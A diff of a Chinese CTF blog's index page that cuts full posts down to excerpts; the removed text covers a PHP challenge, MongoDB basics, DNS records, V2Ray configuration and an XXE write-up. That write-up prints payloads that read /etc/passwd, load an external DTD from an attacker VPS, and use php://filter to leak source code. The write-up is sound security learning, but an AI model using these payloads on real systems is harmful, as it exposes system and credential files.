@@ -417,10 +417,16 @@
       
         
           
-            <h2>web26</h2>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$num=$_GET[<span class="string">'num'</span>]; </span><br><span class="line">$str=$_GET[<span class="string">'str'</span>]; </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($num)&amp;&amp;<span class="keyword">isset</span>($str)) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\d+/sD'</span>,$str)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"vagetable hhhh"</span>; </span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    $result=is_numeric($num) <span class="keyword">and</span> is_numeric($str); </span><br><span class="line">    <span class="keyword">if</span> ($result) &#123; </span><br><span class="line">        <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$flag"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"vagetablessssss"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-
-          
+          web26
+12345678910111
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/16/new-Bugku/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -606,33 +612,15 @@
       
         
           
-            <p>最近接触了一些NoSQL的题目，主要的数据库还是以MongoDb为主，于是总结一下MongoDb的学习</p>
-<p>MongoDb中的数据库，集合，文档和传统的关系型数据的对应就不用细说了</p>
-<p><em>db</em>显示当前使用的数据库
-<em>show dbs</em>显示所有可用的数据库，如果一个数据库里面啥都没有这里就不会显示
-<em>use xxx</em>指定使用哪种个数据库，如果不存在会自动创建
-<em>show tables</em>显示当前数据库下所有的表(又回到了关系型数据库的概念了23333)</p>
-<p>后面的实验都在test数据库下：
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; show tables</span><br><span class="line">runoob</span><br><span class="line">users</span><br></pre></td></tr></table></figure></p>
-<h2>插入数据</h2>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.users.insert(&#123;&apos;username&apos;:&apos;xxx&apos;,&apos;password&apos;:11111&#125;</span><br><span class="line">... )</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br></pre></td></tr></table></figure></p>
-<p>当前表中的内容：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.users.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd7674357af54ea6fb01&quot;), &quot;username&quot; : &quot;prontosil&quot;, &quot;password&quot; : &quot;123456&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd8574357af54ea6fb02&quot;), &quot;username&quot; : &quot;abc&quot;, &quot;password&quot; : &quot;gaashasfa&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd8a74357af54ea6fb03&quot;), &quot;username&quot; : &quot;abcddd&quot;, &quot;password&quot; : &quot;gaasasdfashasfa&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5d53beab74357af54ea6fb04&quot;), &quot;username&quot; : &quot;xxxppp&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5d53c8ae74357af54ea6fb05&quot;), &quot;username&quot; : &quot;pxy&quot;, &quot;password&quot; : 123 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5d5642185a9caa8f023df426&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : 123 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5d564c035a9caa8f023df427&quot;), &quot;username&quot; : &quot;xxx&quot;, &quot;password&quot; : 11111 &#125;</span><br></pre></td></tr></table></figure></p>
-<h2>MongoDb聚合</h2>
-<blockquote>
-<p>MongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果。有点类似sql语句中的 count(*)。</p>
-</blockquote>
-<p>参考菜鸟教程中的栗子：
-集合中的数据如下：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   _id: ObjectId(7df78ad8902c)</span><br><span class="line">   title: &apos;MongoDB Overview&apos;, </span><br><span class="line">   description: &apos;MongoDB is no sql database&apos;,</span><br><span class="line">   by_user: &apos;runoob.com&apos;,</span><br><span class="line">   url: &apos;http://www.runoob.com&apos;,</span><br><span class="line">   tags: [&apos;mongodb&apos;, &apos;database&apos;, &apos;NoSQL&apos;],</span><br><span class="line">   likes: 100</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">   _id: ObjectId(7df78ad8902d)</span><br><span class="line">   title: &apos;NoSQL Overview&apos;, </span><br><span class="line">   description: &apos;No sql database is very fast&apos;,</span><br><span class="line">   by_user: &apos;runoob.com&apos;,</span><br><span class="line">   url: &apos;http://www.runoob.com&apos;,</span><br><span class="line">   tags: [&apos;mongodb&apos;, &apos;database&apos;, &apos;NoSQL&apos;],</span><br><span class="line">   likes: 10</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">   _id: ObjectId(7df78ad8902e)</span><br><span class="line">   title: &apos;Neo4j Overview&apos;, </span><br><span class="line">   description: &apos;Neo4j is no sql database&apos;,</span><br><span class="line">   by_user: &apos;Neo4j&apos;,</span><br><span class="line">   url: &apos;http://www.neo4j.com&apos;,</span><br><span class="line">   tags: [&apos;neo4j&apos;, &apos;database&apos;, &apos;NoSQL&apos;],</span><br><span class="line">   likes: 750</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
-<p>使用aggregate语句：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.mycol.aggregate([&#123;$group : &#123;_id : &quot;$by_user&quot;, num_tutorial : &#123;$sum : 1&#125;&#125;&#125;])</span><br><span class="line">&#123;</span><br><span class="line">   &quot;result&quot; : [</span><br><span class="line">      &#123;</span><br><span class="line">         &quot;_id&quot; : &quot;runoob.com&quot;,</span><br><span class="line">         &quot;num_tutorial&quot; : 2</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         &quot;_id&quot; : &quot;Neo4j&quot;,</span><br><span class="line">         &quot;num_tutorial&quot; : 1</span><br><span class="line">      &#125;</span><br><span class="line">   ],</span><br><span class="line">   &quot;ok&quot; : 1</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
-<p>它类似于：</p>
-<blockquote>
-<p>select by_user, count(*) from mycol group by by_user</p>
-</blockquote>
-
-          
+          最近接触了一些NoSQL的题目，主要的数
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/16/MongoDb学习/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -818,56 +806,15 @@
       
         
           
-            <p>又遇到了一到头疼的MISC签到题，虽说有点脑洞但还是基础知识积累的不够。</p>
-<p>DNS解析记录：</p>
-<blockquote>
-<p>A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发</p>
-</blockquote>
-<p>各种记录简记如下：</p>
-<ul>
-<li>
-<p>A记录： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p>
-</li>
-<li>
-<p>CNAME记录： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名</p>
-</li>
-<li>
-<p>MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</p>
-</li>
-<li>
-<p>NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录</p>
-</li>
-<li>
-<p>TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录</p>
-</li>
-<li>
-<p>AAAA记录： 将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录</p>
-</li>
-<li>
-<p>SRV记录： 添加服务记录服务器服务记录时会添加此项，SRV记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）。</p>
-</li>
-<li>
-<p>SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器</p>
-</li>
-<li>
-<p>PTR记录： PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名</p>
-</li>
-<li>
-<p>显性URL转发记录： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址为：www.itbilu.com。</p>
-</li>
-<li>
-<p>隐性UR转发记录L： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址，隐性转发会隐藏真实的目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址仍然是：www.liuht.cn。</p>
-</li>
-</ul>
-<p>所以这题就是：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">服务器:  192.168.1.1</span><br><span class="line">Address:  192.168.1.1</span><br><span class="line"></span><br><span class="line">非权威应答:</span><br><span class="line">gamectf.com     text =</span><br><span class="line"></span><br><span class="line">        &quot;flag&#123;welcome_TXT&#125;&quot;</span><br></pre></td></tr></table></figure></p>
-<p>比如我的域名解析记录：</p>
-<p><img src="https://i.loli.net/2019/08/16/hHjMUOFqE1KZIlS.png" alt="quicker_27d67457-bbf6-4743-96d0-c339bf676212.png"></p>
-<p>用dig命令也行：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ dig -t txt gamectf.com                                                                                                          </span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.3-Ubuntu &lt;&lt;&gt;&gt; -t txt gamectf.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 16974</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;gamectf.com.                   IN      TXT</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">gamectf.com.            600     IN      TXT     &quot;flag&#123;welcome_TXT&#125;&quot;</span><br><span class="line"></span><br><span class="line">;; Query time: 26 msec</span><br><span class="line">;; SERVER: 192.168.1.1#53(192.168.1.1)</span><br><span class="line">;; WHEN: Fri Aug 16 07:18:56 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 70</span><br></pre></td></tr></table></figure></p>
-<p>使用dig命令甚至可以直观地感受到DNS解析的全过程，然而在我的WSL上只有一点点记录</p>
-
-          
+          又遇到了一到头疼的MISC签到题，虽说有
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/16/DNS解析记录/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1053,31 +1000,16 @@
       
         
           
-            <blockquote>
-<p>V2Ray 使用 inbound(传入) 和 outbound(传出) 的结构，这样的结构非常清晰地体现了数据包的流动方向，同时也使得 V2Ray 功能强大复杂的同时而不混乱，清晰明了。形象地说，我们可以把 V2Ray 当作一个盒子，这个盒子有入口和出口(即 inbound 和 outbound)，我们将数据包通过某个入口放进这个盒子里，然后这个盒子以某种机制（这个机制其实就是路由，后面会讲到）决定这个数据包从哪个出口吐出来。以这样的角度理解的话，V2Ray 做客户端，则 inbound 接收来自浏览器数据，由 outbound 发出去(通常是发到 V2Ray 服务器)；V2Ray 做服务器，则 inbound 接收来自 V2Ray 客户端的数据，由 outbound 发出去(通常是如 Google 等想要访问的目标网站)。</p>
-</blockquote>
-<p>v2ray的工作原理：</p>
-<p>客户端：</p>
-<p>假设客户端配置inbounds，post为1080，协议是socks。首先需要在浏览器中设置代理sock host:127.0.0.1 port 1080</p>
-<p>如果访问google.com 那么浏览器的数据包会发送到本机的1080端口，这个时候数据包被本机的v2ray客户端收到</p>
-<p>再看outbounds。协议是vmess，v2ray客户端接收到数据包之后打包成vmess的格式并且用预设的id加密，然后发送到服务器地址xxxx，端口pppp</p>
-<p>所以如下的配置大概就能理解了：</p>
-<p>客户端：</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"inbounds"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      "port": 1080, // 监听端口</span><br><span class="line">      "protocol": "socks", // 入口协议为 SOCKS 5</span><br><span class="line">      "sniffing": &#123;</span><br><span class="line">        "enabled": true,</span><br><span class="line">        "destOverride": ["http", "tls"]</span><br><span class="line">      &#125;,</span><br><span class="line">      "settings": &#123;</span><br><span class="line">        "auth": "noauth"  //socks的认证设置，noauth 代表不认证，由于 socks 通常在客户端使用，所以这里不认证</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  "outbounds": [</span><br><span class="line">    &#123;</span><br><span class="line">      "protocol": "vmess", // 出口协议</span><br><span class="line">      "settings": &#123;</span><br><span class="line">        "vnext": [</span><br><span class="line">          &#123;</span><br><span class="line">            "address": "serveraddr.com", // 服务器地址，请修改为你自己的服务器 IP 或域名</span><br><span class="line">            "port": 16823,  // 服务器端口</span><br><span class="line">            "users": [</span><br><span class="line">              &#123;</span><br><span class="line">                "id": "b831381d-6324-4d53-ad4f-8cda48b30811",  // 用户 ID，必须与服务器端配置相同</span><br><span class="line">                "alterId": 64 // 此处的值也应当与服务器相同</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>浏览器---&gt;本机的v2ray---&gt;vps监听的端口</p>
-<p>服务端配置：</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"inbounds"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      "port": 16823, // 服务器监听端口</span><br><span class="line">      "protocol": "vmess",    // 主传入协议</span><br><span class="line">      "settings": &#123;</span><br><span class="line">        "clients": [</span><br><span class="line">          &#123;</span><br><span class="line">            "id": "b831381d-6324-4d53-ad4f-8cda48b30811",  // 用户 ID，客户端与服务器必须相同</span><br><span class="line">            "alterId": 64</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  "outbounds": [</span><br><span class="line">    &#123;</span><br><span class="line">      "protocol": "freedom",  // 主传出协议</span><br><span class="line">      "settings": &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>在客户端配置的 inbounds 中，有一个 &quot;sniffing&quot; 字段，V2Ray 手册解释为“流量探测，根据指定的流量类型，重置所请求的目标”，这话不太好理解，简单说这东西就是从网络流量中识别出域名。这个 sniffing 有两个用处：</p>
-<ol>
-<li>解决 DNS 污染；</li>
-<li>对于 IP 流量可以应用后文提到的域名路由规则；</li>
-<li>识别 BT 协议，根据自己的需要拦截或者直连 BT 流量</li>
-</ol>
-<p>接着看服务器，服务器配置的 id 是 b831381d-6324-4d53-ad4f-8cda48b30811，所以 V2Ray 服务器接收到客户端发来的数据包时就会尝试用 b831381d-6324-4d53-ad4f-8cda48b30811 解密，如果解密成功再看一下时间对不对，对的话就把数据包发到 outbound 去，outbound.protocol 是 freedom（freedom 的中文意思是自由，在这里姑且将它理解成直连吧），数据包就直接发到 google.com 了。</p>
-<h2>参考</h2>
-<p><a href="https://guide.v2fly.org/basics/vmess.html#%E9%85%8D%E7%BD%AE%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87" target="_blank" rel="noopener">v2ray配置指南</a></p>
-
           
+V2Ray 使用 inbound(传入
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/15/v2ray学习/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1263,53 +1195,15 @@
       
         
           
-            <p>今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下：</p>
-<p>原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1)</p>
-<p>查看页面的源代码发现：</p>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="comment">// document.getElementById().value</span></span><br><span class="line">     <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">         <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">     <span class="built_in">console</span>.log(xml);</span><br><span class="line">     <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">     xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">             <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">             <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">             <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">             <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span><br><span class="line">     xmlhttp.send(xml);</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure></p>
-<p>显然xml数据是拼接的，直接对<code>&lt;script&gt;</code>进行实体编码就能够xss，然而这题的考点并不是这个。</p>
-<p>xml相关的自然是xxe，也就是XML 外部实体注入</p>
-<p>这需要有一点DTD的知识：</p>
-<blockquote>
-<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。
-DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
-</blockquote>
-<p>DTD的引入是为了规范XML的，从一个栗子可以看：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe.png" alt=""></p>
-<p>DOCTYPE声明了XML由哪些标签，因为XML的标签不同于HTML，是可以自定义的。</p>
-<p>DTD可以在XML文档内部声明，也可以外部引用,同时实体也可以内部声明或者外部引用</p>
-<p><em>内部实体声明D</em></p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Donald</span> <span class="attr">Duck.</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">runoob.com</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><em>外部实体声明</em></p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>最常见的引入外部实体就是通过file协议读取文件：</p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>另一种payload</p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % d SYSTEM "http://vps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>我们可以在自己的VPS上构造
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>也可以这样：</p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://vps//evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>vps上的evil.dtd内容：
-<code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
-<p>不同的程序支持的协议也有区别，比如今天遇到的题目就是支持php伪协议：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe0.png" alt=""></p>
-<p>ok到这里就差不多了。</p>
-<p>献上拿到题目的payload：</p>
-<p><code>&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</code></p>
-<p>其实就是通过php伪协议去读取文件，flag就在index.php里面</p>
-<p>接下来看一道Google ctf2019的题目：</p>
-<p>直奔主题好了，这个题目抓包发现传送的是json格式的数据，但是也可以修改为XML格式的数据，很神奇吧：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe1.png" alt=""></p>
